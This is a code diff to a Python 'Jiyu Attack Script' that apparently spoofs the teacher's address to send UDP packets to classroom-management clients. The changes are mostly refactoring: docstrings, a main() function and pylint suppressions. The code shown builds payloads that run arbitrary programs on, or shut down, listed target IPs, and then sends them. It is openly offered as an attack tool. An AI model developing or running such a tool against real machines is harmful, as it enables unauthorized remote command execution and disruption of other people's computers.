@@ -1,5 +1,3 @@
-# pylint: disable=all
-
 """
 Jiyu Attack Script
 
@@ -46,6 +44,10 @@ except ImportError:
 
 
 def main_parser():
+    """
+    Main parser for the Jiyu attack script.
+    This function sets up the command-line argument parser with various options for network configuration and attack actions
+    """
     parser = argparse.ArgumentParser(
         prog="Jiyu_udp_attack",
         description="Jiyu Attack Script\n\n"
@@ -320,7 +322,8 @@ def setting_parser():
     return parser
 
 
-if __name__ == "__main__":
+def main():
+    """Main function to parse arguments and execute the attack."""
     logger: List[Any] = []
 
     parser = main_parser()
@@ -353,7 +356,9 @@ if __name__ == "__main__":
                     program, args_list = args_list
                 else:
                     parser.error("Invalid execute arguments: expected [program] or [program, args_list]")
-            payload = pkg_execute(program, args_list, "normal" if mode is None else mode)
+            payload = pkg_execute(
+                program, args_list, "normal" if mode is None else mode  # pylint: disable=E0601, E0606
+            )
         elif args.shutdown is not None:
             if len(args.shutdown) == 0:
                 payload = pkg_shutdown()
@@ -387,7 +392,7 @@ if __name__ == "__main__":
         elif args.setting is not None:
             parser2 = setting_parser()
             setting_args = parser2.parse_args(shlex.split(args.setting))
-            payload = pkg_setting(**dict(setting_args._get_kwargs()))
+            payload = pkg_setting(**dict(setting_args._get_kwargs()))  # pylint: disable=protected-access
             logger.append(setting_args)  # Store parsed settings for debugging
         elif args.hex:
             payload = binascii.unhexlify(args.hex.replace(" ", ""))
@@ -408,9 +413,19 @@ if __name__ == "__main__":
             parser.error("Target IP address cannot be empty. Use -h for help.")
 
         for target in targets:
-            broadcast_packet(teacher_ip, teacher_port, target, port, payload, ip_id=args.ip_id)
+            broadcast_packet(
+                teacher_ip, teacher_port, target, port, payload, ip_id=args.ip_id  # pylint: disable=E0601, E0606
+            )
             logger.append(f"Sent packet with a length of {len(payload)} to {target}:{port}")
 
         print(*logger, sep="\n\n")
-    except Exception as e:
+    except Exception as e:  # pylint: disable=broad-except
         parser.error(f"({e.__class__.__name__}) {e}")
+
+
+if __name__ == "__main__":
+    main()
+else:
+    print("This script is intended to be run as a standalone program, not imported as a module.")
+    print("Please run it directly using 'python Jiyu_udp_attack/__main__.py' or similar command.")
+    raise ImportError("This script is not designed to be imported as a module.")
